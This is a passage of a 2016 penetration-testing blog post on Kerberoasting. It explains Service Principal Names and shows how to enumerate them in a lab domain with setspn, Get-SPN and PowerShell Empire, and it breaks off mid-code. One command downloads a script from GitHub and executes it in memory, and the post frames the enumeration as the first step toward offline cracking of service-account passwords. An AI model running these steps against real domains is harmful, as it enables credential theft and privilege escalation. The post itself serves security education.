@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kerberoasting - Part 1 - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Kerberoasting - Part 1" />
+<meta property="og:description" content="Previous works: There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2016/kerberoast-pt1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2016-05-20T07:35:28-05:00" />
+<meta property="article:modified_time" content="2016-05-20T07:35:28-05:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kerberoasting - Part 1"/>
+<meta name="twitter:description" content="Previous works: There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it."/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2016/kerberoast-pt1/" /><link rel="prev" href="https://malicious.link/posts/2016/blackhat-usa-2016/" /><link rel="next" href="https://malicious.link/posts/2016/kerberoast-pt2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kerberoasting - Part 1",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2016\/kerberoast-pt1\/"
+        },"genre": "posts","keywords": "kerberos, impacket, empire, powershell, spn","wordcount":  1614 ,
+        "url": "https:\/\/malicious.link\/posts\/2016\/kerberoast-pt1\/","datePublished": "2016-05-20T07:35:28-05:00","dateModified": "2016-05-20T07:35:28-05:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Rob Fuller"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kerberoasting - Part 1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2016-05-20">2016-05-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1614 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-are-spns">What are SPNs</a></li>
+    <li><a href="#why-would-they-be-associated-with-users">Why would they be associated with users?</a></li>
+    <li><a href="#why-should-i-care">Why should I care?</a></li>
+    <li><a href="#listing-spns">Listing SPNs</a>
+      <ul>
+        <li><a href="#1-setspn">1. SetSPN</a></li>
+        <li><a href="#get-spn">Get-SPN</a></li>
+        <li><a href="#powershell-empire">PowerShell Empire</a></li>
+      </ul>
+    </li>
+    <li><a href="#listing-user-spns">Listing User SPNs</a>
+      <ul>
+        <li><a href="#getuserspnsvbs">GetUserSPNs.vbs</a></li>
+        <li><a href="#getuserspnsps1">GetUserSPNs.ps1</a></li>
+        <li><a href="#impacket">Impacket</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#presentations">Presentations</a></li>
+    <li><a href="#other-write-ups">Other write ups</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><strong>Previous works:</strong> There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it.</p>
+<p><strong>Attacker KB Link:</strong> (to be updated later)</p>
+<p><strong>Common Findings DB Link:</strong> (to be updated later)</p>
+<h2 id="what-are-spns">What are SPNs</h2>
+<p>[Service Principal Names](<a href="https://msdn.microsoft.com/en-us/library/ms677949%28v=vs.85" target="_blank" rel="noopener noreffer ">https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85</a>).aspx) (SPNs) are:</p>
+<blockquote>
+<p>a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.&quot; - MSDN</p>
+</blockquote>
+<p>Basically mapping a service running on a server to an account it&rsquo;s running as so that it can do / accept kerberos authentication. Normally, these services, like &ldquo;CIFS&rdquo; (Windows Shares) run under the context of the computer account.</p>
+<h2 id="why-would-they-be-associated-with-users">Why would they be associated with users?</h2>
+<p>I won&rsquo;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful <strong>&ldquo;NT AUTHORITY\SYSTEM&rdquo;</strong> account. For those who don&rsquo;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.</p>
+<p>One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\NETWORK SERVICE](<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272%28v=vs.85" target="_blank" rel="noopener noreffer ">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85</a>).aspx) and [NT AUTHORITY\LOCAL SERVICE](<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188%28v=vs.85" target="_blank" rel="noopener noreffer ">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85</a>).aspx) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.</p>
+<p>Yes, I know there is such a thing as [Managed Service Accounts](<a href="https://technet.microsoft.com/en-us/library/dd560633%28v=ws.10" target="_blank" rel="noopener noreffer ">https://technet.microsoft.com/en-us/library/dd560633(v=ws.10</a>).aspx) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&rsquo;ll discuss in the last section of this series.</p>
+<h2 id="why-should-i-care">Why should I care?</h2>
+<p>Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly they are some sort of administrative account (Domain Admins).</p>
+<h2 id="listing-spns">Listing SPNs</h2>
+<p>Ok, so, now you know the background and why you want to do this attack,  but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this:</p>
+<ol>
+<li>Just use the built in <code>SetSPN.exe</code> built into Windows</li>
+<li>Use the <a href="https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN" target="_blank" rel="noopener noreffer ">Get-SPN.ps1</a> that <a href="https://twitter.com/_nullbind" target="_blank" rel="noopener noreffer ">@_nullbind</a> (Scott Sutherland) posted about on the NetSPI blog in a post titled <a href="https://blog.netspi.com/faster-domain-escalation-using-ldap/" target="_blank" rel="noopener noreffer ">Faster Domain Escalation using LDAP</a></li>
+<li>Use the <a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener noreffer ">PowerShell Empire</a> <a href="https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py" target="_blank" rel="noopener noreffer ">port of @_nullbind&rsquo;s Get-SPN powershell script</a></li>
+<li>Use <a href="https://twitter.com/timmedin" target="_blank" rel="noopener noreffer ">Tim Medin - @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener noreffer ">GetUserSPNs VB script</a></li>
+<li>Use <a href="https://twitter.com/timmedin" target="_blank" rel="noopener noreffer ">Tim Medin - @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener noreffer ">GetUserSPNs PowerShell script</a></li>
+<li>Use <a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener noreffer ">Impacket</a>&rsquo;s <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener noreffer ">GetUserSPN.py</a> - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe</li>
+</ol>
+<h3 id="1-setspn">1. SetSPN</h3>
+<p>SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his <a href="http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin" target="_blank" rel="noopener noreffer ">presentation</a> and <a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener noreffer ">Kerberoast Github repo</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\&gt;setspn -t sittingduck -q */*
+</span></span><span class="line"><span class="cl">Checking domain DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        TERMSRV/DC1
+</span></span><span class="line"><span class="cl">        TERMSRV/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/DC1.sittingduck.info/DomainDnsZones.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/DC1.sittingduck.info/ForestDnsZones.sittingduck.info
+</span></span><span class="line"><span class="cl">        DNS/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        GC/DC1.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/DC1
+</span></span><span class="line"><span class="cl">        RPC/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/DC1/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        HOST/DC1.sittingduck.info/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        HOST/DC1
+</span></span><span class="line"><span class="cl">        HOST/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/DC1.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/ebee5e45-e3a3-481d-bf6c-29f3833e2392/sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/DC1/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        ldap/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/DC1.sittingduck.info/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        ldap/DC1
+</span></span><span class="line"><span class="cl">        ldap/DC1.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/DC1.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">CN=krbtgt,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        kadmin/changepw
+</span></span><span class="line"><span class="cl">CN=Uber User,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        http/win10.sittingduck.info
+</span></span><span class="line"><span class="cl">CN=WIN7,CN=Computers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/WIN7
+</span></span><span class="line"><span class="cl">        HOST/WIN7
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/WIN7.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/WIN7.sittingduck.info
+</span></span><span class="line"><span class="cl">CN=WIN2K8R2,OU=Domain Controllers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        TERMSRV/win2k8r2.sittingduck.info
+</span></span><span class="line"><span class="cl">        TERMSRV/WIN2K8R2
+</span></span><span class="line"><span class="cl">        ldap/WIN2K8R2
+</span></span><span class="line"><span class="cl">        ldap/win2k8r2.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/win2k8r2.sittingduck.info/DomainDnsZones.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/win2k8r2.sittingduck.info/ForestDnsZones.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/win2k8r2.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/win2k8r2.sittingduck.info/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        ldap/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4._msdcs.sittingduck.info
+</span></span><span class="line"><span class="cl">        ldap/WIN2K8R2/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        HOST/win2k8r2.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">        GC/win2k8r2.sittingduck.info/sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/win2k8r2.sittingduck.info/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        HOST/WIN2K8R2/SITTINGDUCK
+</span></span><span class="line"><span class="cl">        DNS/win2k8r2.sittingduck.info
+</span></span><span class="line"><span class="cl">        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4/sittingduck.info
+</span></span><span class="line"><span class="cl">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/win2k8r2.sittingduck.info
+</span></span><span class="line"><span class="cl">        WSMAN/win2k8r2
+</span></span><span class="line"><span class="cl">        WSMAN/win2k8r2.sittingduck.info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/WIN2K8R2
+</span></span><span class="line"><span class="cl">        HOST/WIN2K8R2
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/WIN2K8R2.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/WIN2K8R2.sittingduck.info
+</span></span><span class="line"><span class="cl">CN=WIN10,CN=Computers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/WIN10
+</span></span><span class="line"><span class="cl">        HOST/WIN10
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/win10.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/win10.sittingduck.info
+</span></span><span class="line"><span class="cl">CN=CA,CN=Computers,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        WSMAN/CA
+</span></span><span class="line"><span class="cl">        WSMAN/CA.sittingduck.info
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/CA
+</span></span><span class="line"><span class="cl">        HOST/CA
+</span></span><span class="line"><span class="cl">        RestrictedKrbHost/CA.sittingduck.info
+</span></span><span class="line"><span class="cl">        HOST/CA.sittingduck.info
+</span></span><span class="line"><span class="cl">CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">        MSSQLSvc/WIN2K8R2.sittingduck.info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Existing SPN found!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Each line that starts with &ldquo;CN&rdquo; is an account&quot; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.</p>
+<h3 id="get-spn">Get-SPN</h3>
+<ul>
+<li>Link: <a href="https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN" target="_blank" rel="noopener noreffer ">nullbind&rsquo;s Get-SPN folder in the Powershellery repo</a></li>
+</ul>
+<p>This module gives you a lot more information than SetSPN did. Having the PasswordLastSet and LastLogon helps to figure out when and <em>if</em> an account has ever been used. In the example below the &ldquo;sqladmin01&rdquo; account has never logged on and was created recently. If this password cracks then there is a good chance that it is some common password set when setting up accounts</p>
+<p><strong>Disclaimer:</strong> As of this writing, this module only works with PowerShell 3.0+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/
+</span></span><span class="line"><span class="cl">nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1&#34;)
+</span></span><span class="line"><span class="cl">PS C:\&gt; Get-SPN -type service -search &#34;MSSQL*&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name            : MSSQL Service Admin
+</span></span><span class="line"><span class="cl">SAMAccount      : sqladmin01
+</span></span><span class="line"><span class="cl">Description     :
+</span></span><span class="line"><span class="cl">UserPrincipal   : sqladmin01@sittingduck.info
+</span></span><span class="line"><span class="cl">DN              : CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">Created         : 5/13/2016 11:13:20 PM
+</span></span><span class="line"><span class="cl">LastModified    : 5/13/2016 11:13:28 PM
+</span></span><span class="line"><span class="cl">PasswordLastSet : 5/13/2016 7:13:20 PM
+</span></span><span class="line"><span class="cl">AccountExpires  : &lt;Never&gt;
+</span></span><span class="line"><span class="cl">LastLogon       : 12/31/1600 7:00:00 PM
+</span></span><span class="line"><span class="cl">GroupMembership :
+</span></span><span class="line"><span class="cl">SPN Count       : 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalNames (SPN):
+</span></span><span class="line"><span class="cl">MSSQLSvc/WIN2K8R2.sittingduck.info
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="powershell-empire">PowerShell Empire</h3>
+<ul>
+<li>Link: <a href="https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py" target="_blank" rel="noopener noreffer ">PowerShell Empire get_spn module</a></li>
+</ul>
+<p>This module basically just incorporates the script from above.</p>
+<p><strong>Disclaimer:</strong> As of this writing, this module only works with PowerShell 3.0+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(Empire: situational_awareness/network/get_spn) &gt; info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           Name: Get-SPN
+</span></span><span class="line"><span class="cl">         Module: situational_awareness/network/get_spn
+</span></span><span class="line"><span class="cl">     NeedsAdmin: False
+</span></span><span class="line"><span class="cl">      OpsecSafe: True
+</span></span><span class="line"><span class="cl">   MinPSVersion: 2
+</span></span><span class="line"><span class="cl">     Background: True
+</span></span><span class="line"><span class="cl">OutputExtension: None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authors:
+</span></span><span class="line"><span class="cl">  @_nullbind
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Description:
+</span></span><span class="line"><span class="cl">  Displays Service Principal Names (SPN) for domain accounts
+</span></span><span class="line"><span class="cl">  based on SPN service name, domain account, or domain group
+</span></span><span class="line"><span class="cl">  via LDAP queries.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Name   Required    Value                     Description
+</span></span><span class="line"><span class="cl">  ----   --------    -------                   -----------
+</span></span><span class="line"><span class="cl">  Search False       MSSQL*                    Search string for group, username, or
+</span></span><span class="line"><span class="cl">                                               service name. Wildcards accepted.
+</span></span><span class="line"><span class="cl">  Type   False       service                   &#39;group&#39;, &#39;user&#39;, or &#39;service&#39;
+</span></span><span class="line"><span class="cl">  Agent  True                                  Agent to run module on.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">(Empire: situational_awareness/network/get_spn) &gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="listing-user-spns">Listing User SPNs</h2>
+<h3 id="getuserspnsvbs">GetUserSPNs.vbs</h3>
+<ul>
+<li>Link: <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener noreffer ">Kerberoast&rsquo;s GetUserSPNs.vbs</a></li>
+</ul>
+<p>GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the &ldquo;HOST&rdquo; SPN, it&rsquo;s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
